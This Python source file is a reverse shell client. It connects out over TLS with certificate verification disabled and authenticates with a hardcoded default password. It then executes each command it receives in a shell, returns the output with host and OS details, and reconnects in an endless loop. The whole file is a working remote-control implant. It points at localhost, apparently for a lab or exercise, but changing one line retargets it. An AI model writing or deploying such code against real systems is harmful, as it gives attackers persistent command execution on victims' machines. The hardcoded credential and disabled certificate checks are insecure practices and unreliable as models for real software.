#!/usr/bin/env python3
"""
Simplified Reverse Shell Client
--------------------
This client connects back to the server and waits for commands.
It handles directory change requests specially and executes all other commands.
"""
import socket
import os
import subprocess
import sys
import ssl
import getpass
import platform
import time

# Configuration
SERVER_IP = '127.0.0.1'  # Local connection to the server
SERVER_PORT = 9999

# Default credentials
DEFAULT_USERNAME = "admin"
DEFAULT_PASSWORD = "secure_admin_pwd_MERIT2025"

def create_secure_connection():
    """Create a secure SSL/TLS connection to the server."""
    try:
        # Create a standard socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Configure SSL context
        context = ssl.create_default_context()
        # For self-signed certificates, we need to disable verification
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        # Wrap the socket with SSL
        secure_socket = context.wrap_socket(sock)
        
        # Connect to the server
        secure_socket.connect((SERVER_IP, SERVER_PORT))
        print(f"[*] Established secure connection to {SERVER_IP}:{SERVER_PORT}")
        
        return secure_socket
    except Exception as e:
        sys.exit(f"[!] Connection failed: {e}")

def authenticate(s):
    """Authenticate with the server."""
    try:
        # Receive authentication request
        auth_request = s.recv(1024).decode("utf-8")
        print(f"[*] Server auth request: {auth_request}")
        
        if auth_request == "AUTH_REQUIRED":
            # Get credentials
            try:
                # Try to get credentials interactively if possible
                username = input("[*] Username: ").strip()
                password = getpass.getpass("[*] Password: ").strip()
            except:
                # If running in a non-interactive environment, use defaults
                print("[!] Non-interactive environment detected, using default credentials")
                username = DEFAULT_USERNAME
                password = DEFAULT_PASSWORD
            
            # Send credentials to server
            auth_string = f"{username}:{password}"
            s.send(auth_string.encode("utf-8"))
            
            # Get response
            response = s.recv(1024).decode("utf-8")
            print(f"[*] Server response: {response}")
            
            if response == "AUTH_SUCCESS":
                print("[*] Authentication successful")
                return True
            else:
                print(f"[!] Authentication failed with response: {response}")
                return False
        else:
            print(f"[!] Unexpected server response: {auth_request}")
            return False
    except Exception as e:
        print(f"[!] Authentication error: {e}")
        return False

def main():
    # Step 1: Create secure connection
    s = create_secure_connection()
    
    # Step 2: Authenticate with the server
    if not authenticate(s):
        s.close()
        sys.exit("[!] Authentication failed. Exiting.")
    
    # Step 3: Command execution loop
    command_buffer = ""
    
    while True:
        try:
            # Receive data
            data = s.recv(1024)
            if not data:
                print("[!] No data received, connection may be closed.")
                break

            # Decode and add to buffer
            received = data.decode("utf-8", errors="ignore")
            command_buffer += received
            
            # Check if command is complete (by newline)
            if "\n" in command_buffer:
                commands = command_buffer.split("\n")
                command_buffer = commands[-1]
                for command in commands[:-1]:
                    if not command.strip():
                        continue
                        
                    print(f"[*] Processing command: {command}")
                    
                    # Handle 'cd ' (change directory) commands separately
                    if command.startswith('cd '):
                        try:
                            os.chdir(command[3:].strip())
                            output = f"[*] Changed directory to {os.getcwd()}\n"
                        except Exception as e:
                            output = f"[!] Error changing directory: {e}\n"
                    elif command.lower() == "quit":
                        print("[*] Received quit command. Closing connection.")
                        s.close()
                        return
                    else:
                        # Execute the received command using subprocess
                        try:
                            proc = subprocess.Popen(
                                command,
                                shell=True,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE
                            )
                            stdout, stderr = proc.communicate(timeout=30)  # Add a timeout
                            output = stdout.decode() + stderr.decode()
                        except subprocess.TimeoutExpired:
                            # Handle commands that take too long
                            proc.kill()
                            output = "[!] Command execution timed out (30s limit)\n"
                        except Exception as e:
                            output = f"[!] Error executing command: {e}\n"

                    # Append current working directory and system info as a prompt
                    system_info = f"{platform.node()} ({platform.system()} {platform.release()})"
                    cwd = f"{os.getcwd()}> "
                    final_output = f"{output}{system_info} - {cwd}"

                    s.send(final_output.encode("utf-8"))
                    
        except Exception as e:
            print(f"[!] Error in command execution: {e}")
            break

    s.close()
    print("[!] Connection closed")

if __name__ == '__main__':
    while True:
        try:
            main()
            print("[!] Connection lost. Attempting to reconnect in 10 seconds...")
            time.sleep(10)
        except KeyboardInterrupt:
            print("[!] Exiting...")
            break
        except Exception as e:
            print(f"[!] Error: {e}. Attempting to reconnect in 10 seconds...")
            time.sleep(10)